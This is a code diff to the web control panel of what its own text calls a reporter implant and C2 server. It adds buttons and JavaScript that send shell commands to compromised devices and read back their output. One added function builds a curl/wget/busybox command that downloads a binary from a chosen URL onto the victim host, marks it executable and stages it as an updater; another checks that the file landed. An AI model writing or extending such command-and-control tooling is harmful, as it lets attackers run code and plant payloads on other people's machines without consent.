@@ -69,9 +69,11 @@
             </div>
             <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:12px;">
                 <button id="download-launch-btn" class="btn-primary">Download & Launch Helper</button>
+                <button id="download-only-btn" class="btn-secondary">Download Only</button>
+                <button id="check-updater-btn" class="btn-secondary">Check Helper File</button>
                 <button id="refresh-btn" class="btn-secondary">Refresh Devices</button>
             </div>
-            <p style="margin-top:16px; color:#4b5563; font-size:0.95rem;">This helper will be downloaded by the current reporter implant and started as a separate updater process. The updater can upload its own connection back to the same C2 server and manage the reporter binary safely.</p>
+            <p style="margin-top:16px; color:#4b5563; font-size:0.95rem;">This helper will be downloaded by the current reporter implant and started as a separate updater process. Use Download Only to stage the updater binary first, then Check Helper File to confirm it landed before launching it.</p>
         </div>
 
         <div class="card">
@@ -117,6 +119,8 @@
         const reporterPathInput = document.getElementById('reporter-path');
         const updaterSavePathInput = document.getElementById('updater-save-path');
         const downloadLaunchBtn = document.getElementById('download-launch-btn');
+        const downloadOnlyBtn = document.getElementById('download-only-btn');
+        const checkUpdaterBtn = document.getElementById('check-updater-btn');
         const refreshBtn = document.getElementById('refresh-btn');
         const sendTaskBtn = document.getElementById('send-task-btn');
         const taskPayloadInput = document.getElementById('task-payload');
@@ -192,22 +196,83 @@
             return `${downloadCmd} && ${launchCmd}`;
         }
 
+        async function fetchShellOutput(deviceId) {
+            const url = `/shell_output?device_id=${encodeURIComponent(deviceId)}`;
+            const res = await fetch(url);
+            if (!res.ok) {
+                taskResponse.textContent = 'Unable to fetch shell output yet.';
+                return;
+            }
+            const data = await res.json();
+            if (data.output) {
+                taskResponse.textContent = data.output;
+            } else if (data.error) {
+                taskResponse.textContent = `Error: ${data.error}`;
+            } else {
+                taskResponse.textContent = 'No shell output available.';
+            }
+        }
+
+        async function sendReporterShell(deviceId, command, summary) {
+            if (!deviceId) {
+                alert('Select a reporter device first.');
+                return;
+            }
+            const fd = new FormData();
+            fd.append('device_id', deviceId);
+            fd.append('command', command);
+            const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
+            if (res.ok) {
+                taskResponse.textContent = `${summary} command sent. Waiting for shell output...`;
+                setTimeout(() => fetchShellOutput(deviceId), 1500);
+            } else {
+                const data = await res.json().catch(() => null);
+                taskResponse.textContent = data ? JSON.stringify(data, null, 2) : 'Failed to send shell command.';
+            }
+        }
+
+        function buildDownloadOnlyCommand() {
+            const url = updaterUrlInput.value.trim();
+            const savePath = updaterSavePathInput.value.trim();
+            if (!url || !savePath) {
+                throw new Error('Fill updater URL and save path.');
+            }
+            const escapedUrl = url.replace(/"/g, '\\"');
+            const escapedSave = savePath.replace(/"/g, '\\"');
+            return `if command -v curl >/dev/null 2>&1; then curl -fsSL "${escapedUrl}" -o "${escapedSave}"; elif command -v wget >/dev/null 2>&1; then wget -qO "${escapedSave}" "${escapedUrl}"; elif command -v busybox >/dev/null 2>&1; then busybox wget -qO "${escapedSave}" "${escapedUrl}"; else echo DOWNLOAD_FAILED; exit 1; fi && chmod +x "${escapedSave}" && echo DOWNLOAD_OK`;
+        }
+
+        function buildCheckCommand() {
+            const savePath = updaterSavePathInput.value.trim();
+            if (!savePath) {
+                throw new Error('Fill updater save path.');
+            }
+            const escapedSave = savePath.replace(/"/g, '\\"');
+            return `if [ -f "${escapedSave}" ]; then ls -l "${escapedSave}"; else echo MISSING; fi`;
+        }
+
         downloadLaunchBtn.addEventListener('click', async () => {
             try {
-                if (!reporterSelect.value) {
-                    alert('Select a reporter device first.');
-                    return;
-                }
                 const cmd = buildLaunchCommand();
-                const fd = new FormData();
-                fd.append('device_id', reporterSelect.value);
-                fd.append('command', cmd);
-                const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
-                if (res.ok) {
-                    taskResponse.textContent = 'Updater launch command sent. Wait for the helper connection to appear in Active Connections.';
-                } else {
-                    taskResponse.textContent = 'Failed to send updater launch command.';
-                }
+                await sendReporterShell(reporterSelect.value, cmd, 'Updater launch');
+            } catch (err) {
+                taskResponse.textContent = err.message;
+            }
+        });
+
+        downloadOnlyBtn.addEventListener('click', async () => {
+            try {
+                const cmd = buildDownloadOnlyCommand();
+                await sendReporterShell(reporterSelect.value, cmd, 'Download-only');
+            } catch (err) {
+                taskResponse.textContent = err.message;
+            }
+        });
+
+        checkUpdaterBtn.addEventListener('click', async () => {
+            try {
+                const cmd = buildCheckCommand();
+                await sendReporterShell(reporterSelect.value, cmd, 'Check updater file');
             } catch (err) {
                 taskResponse.textContent = err.message;
             }
